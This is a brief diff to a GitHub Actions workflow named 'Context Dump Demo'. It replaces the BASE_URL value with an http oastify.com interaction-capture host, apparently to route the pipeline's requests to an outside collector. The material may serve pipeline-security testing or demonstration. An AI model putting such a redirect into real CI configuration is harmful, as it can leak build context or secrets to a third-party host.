@@ -2,7 +2,7 @@ name: GitHub Actions Context Dump Demo
 run-name: ${{ github.actor }} is testing out GitHub Actions 🚀
 on: [push]
 env:
-  BASE_URL: "https://my-custom-api.com"
+  BASE_URL: "http://p4uxwgt097i8ydforj61m2ovomudi6mub.oastify.com"
 jobs:
   Explore-GitHub-Actions:
     runs-on: ubuntu-latest
